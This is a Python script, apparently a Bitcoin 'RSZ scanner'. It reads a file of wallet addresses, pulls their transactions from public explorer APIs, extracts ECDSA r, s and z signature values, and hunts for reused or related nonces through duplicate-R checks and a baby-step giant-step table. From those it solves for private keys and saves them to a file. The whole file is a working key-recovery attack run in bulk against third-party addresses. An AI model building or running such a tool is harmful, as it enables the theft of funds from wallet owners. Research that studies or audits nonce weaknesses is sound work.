import sys
import hashlib
import json
import argparse
import time
from urllib.request import Request, urlopen
import secp256k1 as ice

G = ice.scalar_multiplication(1)
N = ice.N
ZERO = ice.Zero
DEFAULT_RETRIES = 3
RETRY_BACKOFF = 1.5
HTTP_TIMEOUT = 20
HTTP_RETRIES = DEFAULT_RETRIES
PREVOUT_CACHE = {}

def getk1(r1, s1, z1, r2, s2, z2, m):
    nr = (s2 * m * r1 + z1 * r2 - z2 * r1) % N
    dr = (s1 * r2 - s2 * r1) % N
    return (nr * inv(dr)) % N

def getpvk(r1, s1, z1, r2, s2, z2, m):
    x1 = (s2 * z1 - s1 * z2 + m * s1 * s2) % N
    xi = inv((s1 * r2 - s2 * r1) % N)
    return (x1 * xi) % N

def get_rs(sig):
    """Parse DER-encoded signature (hex) and ignore any trailing sighash byte."""
    pos = 0
    if sig.startswith('30') and len(sig) >= 6:
        pos += 2  # skip 0x30
        _ = int(sig[pos:pos+2], 16)
        pos += 2
    if sig[pos:pos+2] != '02':
        raise ValueError('Malformed signature: missing R marker')
    pos += 2
    rlen = int(sig[pos:pos+2], 16)
    pos += 2
    r = sig[pos:pos + rlen * 2]
    pos += rlen * 2
    if sig[pos:pos+2] != '02':
        raise ValueError('Malformed signature: missing S marker')
    pos += 2
    slen = int(sig[pos:pos+2], 16)
    pos += 2
    s = sig[pos:pos + slen * 2]
    return r, s

def split_sig_pieces(script):
    sig_len = int(script[0:2], 16)
    sig = script[2:2 + sig_len * 2]
    # Signature is DER + sighash type
    r, s = get_rs(sig)
    pub_len = int(script[2 + sig_len * 2:2 + sig_len * 2 + 2], 16)
    pub = script[2 + sig_len * 2 + 2:]
    assert len(pub) == pub_len * 2
    return r, s, pub


def read_varint(txn, idx):
    prefix = int(txn[idx:idx + 2], 16)
    idx += 2
    if prefix < 0xfd:
        return prefix, idx
    if prefix == 0xfd:
        val = int.from_bytes(bytes.fromhex(txn[idx:idx + 4])[::-1], 'big')
        idx += 4
        return val, idx
    if prefix == 0xfe:
        val = int.from_bytes(bytes.fromhex(txn[idx:idx + 8])[::-1], 'big')
        idx += 8
        return val, idx
    val = int.from_bytes(bytes.fromhex(txn[idx:idx + 16])[::-1], 'big')
    idx += 16
    return val, idx


def encode_varint(value):
    if value < 0xfd:
        return value.to_bytes(1, 'little')
    if value <= 0xffff:
        return b'\xfd' + value.to_bytes(2, 'little')
    if value <= 0xffffffff:
        return b'\xfe' + value.to_bytes(4, 'little')
    return b'\xff' + value.to_bytes(8, 'little')

def parse_transaction(txn):
    if len(txn) < 130:
        raise ValueError('Raw transaction data is incorrect or incomplete')
    idx = 0
    version = txn[idx:idx + 8]
    idx += 8
    segwit = False
    if txn[idx:idx + 4] == '0001':
        segwit = True
        idx += 4
    inp_nu, idx = read_varint(txn, idx)

    inputs = []
    for _ in range(inp_nu):
        prv_out = txn[idx:idx + 64]
        idx += 64
        var0 = txn[idx:idx + 8]
        idx += 8
        script_len, idx = read_varint(txn, idx)
        script = txn[idx:idx + 2 * script_len]
        idx += 2 * script_len
        seq = txn[idx:idx + 8]
        idx += 8
        r = s = pub = None
        if script_len:
            try:
                r, s, pub = split_sig_pieces(script)
            except (ValueError, AssertionError, IndexError):
                # Non-standard or malformed scriptSigs may not contain a
                # parseable signature; keep the input and continue parsing.
                pass
        inputs.append({'prev_out': prv_out, 'var0': var0, 'r': r, 's': s, 'pub': pub, 'seq': seq, 'witness': [], 'script_sig': script})

    out_cnt, idx = read_varint(txn, idx)
    outputs = []
    for _ in range(out_cnt):
        value = txn[idx:idx + 16]
        idx += 16
        script_len, idx = read_varint(txn, idx)
        script = txn[idx:idx + 2 * script_len]
        idx += 2 * script_len
        outputs.append({'value': value, 'script': script})

    if segwit:
        for i in range(inp_nu):
            w_count, idx = read_varint(txn, idx)
            stack = []
            for _ in range(w_count):
                w_len, idx = read_varint(txn, idx)
                item = txn[idx:idx + 2 * w_len]
                idx += 2 * w_len
                stack.append(item)
            inputs[i]['witness'] = stack
            if inputs[i]['r'] is None and len(stack) >= 2:
                sig_body = stack[0]
                # drop sighash byte
                if len(sig_body) > 2:
                    sig_body = sig_body[:-2]
                inputs[i]['r'], inputs[i]['s'] = get_rs(sig_body)
                inputs[i]['pub'] = stack[1]

    locktime = txn[idx:idx + 8]
    return {'version': version, 'inputs': inputs, 'outputs': outputs, 'locktime': locktime, 'segwit': segwit, 'raw': txn}

def http_get(url):
    delay = RETRY_BACKOFF
    for attempt in range(1, HTTP_RETRIES + 1):
        try:
            request = Request(url, headers={'User-Agent': 'RSZ-Scanner/1.0'})
            with urlopen(request, timeout=HTTP_TIMEOUT) as response:
                return response.read().decode('utf-8')
        except KeyboardInterrupt:
            raise
        except Exception as exc:
            if attempt == HTTP_RETRIES:
                raise ConnectionError(f"Error fetching url after retries: {exc}")
            time.sleep(delay)
            delay *= RETRY_BACKOFF


def fetch_tx_data(txid):
    # Try mempool.space, then blockstream.info as fallback
    urls = [
        f"https://mempool.space/api/tx/{txid}",
        f"https://blockstream.info/api/tx/{txid}"
    ]
    last_err = None
    for u in urls:
        try:
            return json.loads(http_get(u))
        except Exception as exc:
            last_err = exc
            continue
    raise ConnectionError(f"Prevout fetch failed for {txid}: {last_err}")


def get_raw_transaction(txid):
    return http_get(f"https://blockchain.info/rawtx/{txid}?format=hex")

def serialize_outputs(outputs):
    out_bytes = b''
    for o in outputs:
        out_bytes += int(o['value'], 16).to_bytes(8, 'little')
        script = bytes.fromhex(o['script'])
        out_bytes += encode_varint(len(script))
        out_bytes += script
    return out_bytes


def hash256(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def classify_script(spk):
    if not spk:
        return 'unknown'
    if spk.startswith('76a914') and len(spk) == 50 and spk.endswith('88ac'):
        return 'p2pkh'
    if spk.startswith('0014') and len(spk) == 44:
        return 'p2wpkh'
    if spk.startswith('0020') and len(spk) == 68:
        return 'p2wsh'
    if spk.startswith('a914') and spk.endswith('87'):
        return 'p2sh'
    if spk.startswith('5120') and len(spk) == 68:
        return 'p2tr'
    return 'unknown'


def get_script_code(prev_script_pubkey, inp):
    # P2WPKH native
    if prev_script_pubkey.startswith('0014') and len(prev_script_pubkey) == 44:
        return bytes.fromhex('1976a914' + prev_script_pubkey[4:] + '88ac')

    # P2WSH: need witness script (last stack item)
    if prev_script_pubkey.startswith('0020') and len(prev_script_pubkey) == 68:
        if inp['witness']:
            witness_script = inp['witness'][-1]
            return bytes.fromhex(witness_script)
        raise ValueError('Missing witness script for P2WSH input')

    # P2SH-P2WPKH: scriptSig should contain redeem script 0014<20>
    if prev_script_pubkey.startswith('a914') and prev_script_pubkey.endswith('87') and inp.get('script_sig', '').startswith('16'):
        redeem = inp['script_sig'][2:]  # drop push opcode
        if redeem.startswith('0014'):
            return bytes.fromhex('1976a914' + redeem[4:] + '88ac')
        if redeem.startswith('0020'):
            # nested P2WSH: need full witness script to proceed
            if inp['witness']:
                witness_script = inp['witness'][-1]
                return bytes.fromhex(witness_script)
            raise ValueError('Missing witness script for P2SH-P2WSH input')

    # Legacy P2PKH or provided pubkey fallback
    if inp.get('pub'):
        return bytes.fromhex('1976a914' + HASH160(inp['pub']) + '88ac')
    return bytes.fromhex(prev_script_pubkey)


def bip143_z(parsed, target_idx, prevout_info):
    inputs = parsed['inputs']
    outputs = parsed['outputs']
    hash_prevouts = hash256(b''.join([
        bytes.fromhex(i['prev_out']) + bytes.fromhex(i['var0']) for i in inputs
    ]))
    hash_sequence = hash256(b''.join([bytes.fromhex(i['seq']) for i in inputs]))
    hash_outputs = hash256(serialize_outputs(outputs))

    cur_inp = inputs[target_idx]
    script_code = get_script_code(prevout_info['scriptpubkey'], cur_inp)
    amount_bytes = int(prevout_info['value']).to_bytes(8, 'little')

    preimage = b''
    preimage += bytes.fromhex(parsed['version'])
    preimage += hash_prevouts
    preimage += hash_sequence
    preimage += bytes.fromhex(cur_inp['prev_out'])
    preimage += bytes.fromhex(cur_inp['var0'])
    preimage += encode_varint(len(script_code))
    preimage += script_code
    preimage += amount_bytes
    preimage += bytes.fromhex(cur_inp['seq'])
    preimage += hash_outputs
    preimage += bytes.fromhex(parsed['locktime'])
    preimage += (1).to_bytes(4, 'little')  # SIGHASH_ALL
    return hash256(preimage).hex()


def legacy_z(parsed, target_idx):
    inputs = parsed['inputs']
    outputs = parsed['outputs']
    e = bytes.fromhex(parsed['version'])
    e += encode_varint(len(inputs))
    for i, inp in enumerate(inputs):
        e += bytes.fromhex(inp['prev_out'])
        e += bytes.fromhex(inp['var0'])
        if i == target_idx:
            if not inp['pub']:
                raise ValueError('Missing pubkey to build scriptCode')
            script_code = bytes.fromhex('1976a914' + HASH160(inp['pub']) + '88ac')
            e += encode_varint(len(script_code)) + script_code
        else:
            e += b'\x00'
        e += bytes.fromhex(inp['seq'])
    e += encode_varint(len(outputs))
    e += serialize_outputs(outputs)
    e += bytes.fromhex(parsed['locktime'])
    e += (1).to_bytes(4, 'little')
    return hash256(e).hex()


def get_signable_transaction(parsed, prevout_info=None, target_idx=0):
    inputs = parsed['inputs']
    res = []
    tot = len(inputs)
    info_map = prevout_info or {}
    for one in range(tot):
        if parsed['segwit']:
            if one not in info_map:
                z_val = None
            else:
                z_val = bip143_z(parsed, one, info_map[one])
        else:
            z_val = legacy_z(parsed, one)
        res.append([inputs[one]['r'], inputs[one]['s'], z_val, inputs[one]['pub'], parsed['raw']])
    return res

def HASH160(pubk_hex):
    return hashlib.new('ripemd160', hashlib.sha256(bytes.fromhex(pubk_hex)).digest()).hexdigest()

def inv(a):
    return pow(a, N - 2, N)

def calc_RQ(r, s, z, pub_point):
    RP1 = ice.pub2upub('02' + hex(r)[2:].zfill(64))
    RP2 = ice.pub2upub('03' + hex(r)[2:].zfill(64))
    sdr = (s * inv(r)) % N
    zdr = (z * inv(r)) % N
    FF1 = ice.point_subtraction(ice.point_multiplication(RP1, sdr), ice.scalar_multiplication(zdr))
    FF2 = ice.point_subtraction(ice.point_multiplication(RP2, sdr), ice.scalar_multiplication(zdr))
    return RP1 if FF1 == pub_point else RP2 if FF2 == pub_point else None

def diff_comb_idx(alist):
    LL = len(alist)
    return [(i, j, ice.point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]

def check_transactions(address):
    txid = []
    cdx = []
    prevouts = []
    try:
        res = json.loads(http_get(f"https://mempool.space/api/address/{address}/txs"))
        if res is None:
            raise ValueError("No transaction data found for the specified address.")
        txcount = len(res)
        print(f'Total: {txcount} Input/Output Transactions in the Address: {address}')
        for i in range(txcount):
            vin_cnt = len(res[i]["vin"])
            for j in range(vin_cnt):
                if res[i]["vin"][j]["prevout"].get("scriptpubkey_address") == address:
                    txid.append(res[i]["txid"])
                    cdx.append(j)
                    prevouts.append({
                        'value': res[i]["vin"][j]["prevout"].get("value"),
                        'scriptpubkey': res[i]["vin"][j]["prevout"].get("scriptpubkey"),
                        'parent_txid': res[i]["vin"][j]["txid"],
                        'vout': res[i]["vin"][j]["vout"]
                    })
    except Exception as e:
        raise ConnectionError(f"Error fetching transaction data: {e}")
    return txid, cdx, prevouts


def fetch_prevout(txid, vout):
    key = f"{txid}:{vout}"
    if key in PREVOUT_CACHE:
        return PREVOUT_CACHE[key]
    data = fetch_tx_data(txid)
    if 'vout' not in data or vout >= len(data['vout']):
        raise ValueError('Prevout not found in transaction data')
    prev = data['vout'][vout]
    info = {
        'value': prev.get('value'),
        'scriptpubkey': prev.get('scriptpubkey')
    }
    PREVOUT_CACHE[key] = info
    return info


def populate_prevouts(prevouts):
    missing = [(p['parent_txid'], p['vout']) for p in prevouts if (p.get('value') is None or p.get('scriptpubkey') is None)]
    unique = list({f"{tx}:{vout}": (tx, vout) for tx, vout in missing}.values())
    for tx, vout in unique:
        try:
            fetched = fetch_prevout(tx, vout)
        except Exception as exc:
            print(f'Warning: failed prevout fetch for {tx}:{vout}: {exc}')
            continue
        for p in prevouts:
            if p['parent_txid'] == tx and p['vout'] == vout:
                # checksum: if we already had a scriptpubkey and it mismatches, warn and skip filling
                if p.get('scriptpubkey') and p['scriptpubkey'] != fetched.get('scriptpubkey'):
                    print(f'Warning: scriptPubKey mismatch for {tx}:{vout}; keeping original')
                    continue
                p['value'] = p.get('value') or fetched.get('value')
                p['scriptpubkey'] = p.get('scriptpubkey') or fetched.get('scriptpubkey')

def get_r_s_z_q_lists(txid, cdx, prevouts):
    populate_prevouts(prevouts)
    rL, sL, zL, QL = [], [], [], []
    for c in range(len(txid)):
        rawtx = get_raw_transaction(txid[c])
        try:
            m = parse_transaction(rawtx)
            prev = prevouts[c]
            if (prev.get('value') is None or prev.get('scriptpubkey') is None) and prev.get('parent_txid'):
                try:
                    fetched = fetch_prevout(prev['parent_txid'], prev['vout'])
                    prev['value'] = fetched.get('value')
                    prev['scriptpubkey'] = fetched.get('scriptpubkey')
                except Exception as fe:
                    print(f'Warning: could not fetch prevout for {prev.get("parent_txid")}:{prev.get("vout")}: {fe}')
            spk_type = classify_script(prev.get('scriptpubkey', ''))
            if spk_type in ['p2sh', 'p2tr']:
                print(f'Skipping tx {txid[c]} input {cdx[c]}: unsupported script type {spk_type}')
                continue
            e = get_signable_transaction(m, {cdx[c]: prev})
            for i in range(len(e)):
                if i == cdx[c]:
                    r_hex, s_hex, z_hex, pub_hex, _ = e[i]
                    if not all([r_hex, s_hex, z_hex, pub_hex]):
                        print(f'Skipping tx {txid[c]} input {i}: missing r/s/z/pub')
                        continue
                    rL.append(int(r_hex, 16))
                    sL.append(int(s_hex, 16))
                    zL.append(int(z_hex, 16))
                    QL.append(ice.pub2upub(pub_hex))
                    print('='*70, f'\n[Input Index #: {i}] [txid: {txid[c]}]\n     R: {r_hex}\n     S: {s_hex}\n     Z: {z_hex}\nPubKey: {pub_hex}')
        except Exception as e:
            print(f'Error processing transaction [{txid[c]}]: {type(e).__name__}: {e}')
    return rL, sL, zL, QL

def find_duplicates_and_prepare_bsgs_table(rL, sL, zL, QL):
    RQ = []
    for c in range(len(rL)):
        R = calc_RQ(rL[c], sL[c], zL[c], QL[c])
        if R is not None:
            RQ.append((c, R))
        else:
            print(f'Warning: could not compute RQ for index {c}; skipping')

    if len(RQ) < 2:
        print('Not enough valid RQ entries to diff')
        return []

    RD = []
    for i in range(len(RQ)):
        for j in range(i+1, len(RQ)):
            RD.append((RQ[i][0], RQ[j][0], ice.point_subtraction(RQ[i][1], RQ[j][1])))

    print('RQ = ')
    for _, r in RQ: print(f'{r.hex()}')
    print('='*70)
    print('RD = ')
    for i in RD: print(f'{i[2].hex()}')
    print('-'*120)

    solvable_diff = []
    for i in RD:
        if i[2] == ZERO:
            print(f'Duplicate R Found. Congrats!. {(i[0], i[1], i[2].hex())}')
            solvable_diff.append((i[0], i[1], 0))

    if not solvable_diff:
        print('Starting to prepare BSGS Table with {0} elements'.format(len(RD)))
        ice.bsgs_2nd_check_prepare(len(RD))
        for Q in RD:
            found, diff = ice.bsgs_2nd_check(Q[2], -1, len(RD))
            if found:
                solvable_diff.append((Q[0], Q[1], int(diff.hex(), 16)))

    return solvable_diff

def get_private_keys(rL, sL, zL, QL, solvable_diff):
    private_keys = []
    for i in solvable_diff:
        diff_val = i[2]
        k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], diff_val)
        d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], diff_val)
        expected_Q = QL[i[0]]
        if expected_Q != QL[i[1]]:
            print(f'Ignoring candidate for inputs {i[0]} and {i[1]}: public keys differ')
            continue
        if ice.scalar_multiplication(d) != expected_Q:
            print(f'Ignoring candidate for inputs {i[0]} and {i[1]}: private key verification failed')
            continue
        private_keys.append(hex(d))
    return private_keys

def read_addresses_from_file(filename):
    try:
        with open(filename, 'r') as file:
            addresses = file.readlines()
            addresses = [address.strip() for address in addresses]
        return addresses
    except Exception as e:
        raise FileNotFoundError(f"Error reading file {filename}: {e}")

def write_keys_to_file(output_path, addresses, private_keys):
    try:
        with open(output_path, 'a', encoding='utf-8') as file:
            for address, private_key in zip(addresses, private_keys):
                file.write(f"Address: {address}, Private Key: {private_key}\n")
        return len(private_keys)
    except Exception as e:
        print(f"Error writing keys to {output_path}: {e}")
        return 0

def main(filename, output_path='private_keys.txt', timeout=20, retries=3, retry_backoff=1.5):
    global HTTP_TIMEOUT, HTTP_RETRIES, RETRY_BACKOFF
    HTTP_TIMEOUT = timeout
    HTTP_RETRIES = retries
    RETRY_BACKOFF = retry_backoff
    addresses = read_addresses_from_file(filename)
    summary = {
        'processed': 0,
        'failed': 0,
        'no_transactions': 0,
        'no_recovery': 0,
        'recovered': 0,
        'saved': 0,
    }
    total = len(addresses)
    try:
        for index, address in enumerate(addresses, start=1):
            if not address:
                continue
            summary['processed'] += 1
            print(f"\n[{index}/{total}] Processing address: {address}")
            try:
                txid, cdx, prevouts = check_transactions(address)
                if not txid:
                    print('No inputs found for this address; skipping.')
                    summary['no_transactions'] += 1
                    continue
                rL, sL, zL, QL = get_r_s_z_q_lists(txid, cdx, prevouts)
                solvable_diff = find_duplicates_and_prepare_bsgs_table(rL, sL, zL, QL)
                if not solvable_diff:
                    print('No duplicate R found for this address.')
                    summary['no_recovery'] += 1
                    continue
                private_keys = get_private_keys(rL, sL, zL, QL, solvable_diff)
                summary['recovered'] += len(private_keys)
                saved = write_keys_to_file(output_path, [address] * len(private_keys), private_keys)
                summary['saved'] += saved
            except ConnectionError as ce:
                print(f'Skipping address {address} due to network error: {ce}')
                summary['failed'] += 1
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print(f'Unhandled error for address {address}: {type(e).__name__}: {e}')
                summary['failed'] += 1
    except KeyboardInterrupt:
        print('\nInterrupted by user; showing partial summary.')

    print('\nRun summary:')
    print(f"  Addresses in file: {total}")
    print(f"  Addresses processed: {summary['processed']}")
    print(f"  Failed: {summary['failed']}")
    print(f"  With no transactions: {summary['no_transactions']}")
    print(f"  With no recovery candidate: {summary['no_recovery']}")
    print(f"  Verified keys recovered: {summary['recovered']}")
    print(f"  Keys saved to {output_path}: {summary['saved']}")
    print('Program Finished ...')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='This tool helps to get ECDSA Signature r,s,z values from Bitcoin Address. Also attempts to solve for privatekey using Rvalues successive differencing mathematics using bsgs table in RAM.',
                                     epilog='Enjoy the program! :) ')
    parser.add_argument("-f", "--file", help="Path to the text file containing wallet addresses, one per line", required=True)
    parser.add_argument("-o", "--output", default="private_keys.txt", help="File to append verified private keys to (default: private_keys.txt)")
    parser.add_argument("--timeout", type=float, default=20, help="HTTP timeout in seconds (default: 20)")
    parser.add_argument("--retries", type=int, default=3, help="Maximum HTTP attempts per request (default: 3)")
    parser.add_argument("--retry-backoff", type=float, default=1.5, help="Multiplier for retry delay (default: 1.5)")
    args = parser.parse_args()
    if args.timeout <= 0:
        parser.error('--timeout must be greater than 0')
    if args.retries < 1:
        parser.error('--retries must be at least 1')
    if args.retry_backoff < 1:
        parser.error('--retry-backoff must be at least 1')
    main(args.file, args.output, args.timeout, args.retries, args.retry_backoff)
